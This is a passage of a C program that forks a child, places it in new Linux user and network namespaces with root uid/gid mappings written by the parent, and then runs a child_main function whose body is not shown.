  if (waitpid(pid, &status, 0) < 0) die_errno("waitpid");

  if (WIFEXITED(status)) return WEXITSTATUS(status);
  if (WIFSIGNALED(status))
    die("child terminated with signal %d", WTERMSIG(status));
  die("child ended unexpectedly");
  return EXIT_FAILURE;
}

static int run_with_userns_netns(void) {
  int child_ready[2];
  int parent_ready[2];
  pid_t pid;

  if (pipe(child_ready) < 0) die_errno("pipe(child_ready)");
  if (pipe(parent_ready) < 0) die_errno("pipe(parent_ready)");

  pid = fork();
  if (pid < 0) die_errno("fork");

  if (pid == 0) {
    close(child_ready[0]);
    close(parent_ready[1]);

    if (unshare(CLONE_NEWUSER) < 0) die_errno("unshare(CLONE_NEWUSER)");
    if (prctl(PR_SET_DUMPABLE, 1) < 0) die_errno("prctl(PR_SET_DUMPABLE)");

    send_child_signal(child_ready[1], "notify parent for uid_map");
    wait_for_child_signal(parent_ready[0], "wait for uid_map");

    if (setresgid(0, 0, 0) < 0) die_errno("setresgid");
    if (setresuid(0, 0, 0) < 0) die_errno("setresuid");
    if (unshare(CLONE_NEWNET) < 0) die_errno("unshare(CLONE_NEWNET)");

    close(child_ready[1]);
    close(parent_ready[0]);
    fflush(NULL);
    exit(child_main());
  }

  close(child_ready[1]);
  close(parent_ready[0]);

  wait_for_child_signal(child_ready[0], "wait for child userns");
  setup_child_uid_gid_map(pid);
  send_child_signal(parent_ready[1], "send uid_map ready");

  close(child_ready[0]);
  close(parent_ready[1]);
  return wait_child(pid);
}

int main(void) {
  setvbuf(stdout, NULL, _IONBF, 0);
  setvbuf(stderr, NULL, _IONBF, 0);
  return run_with_userns_netns();
}
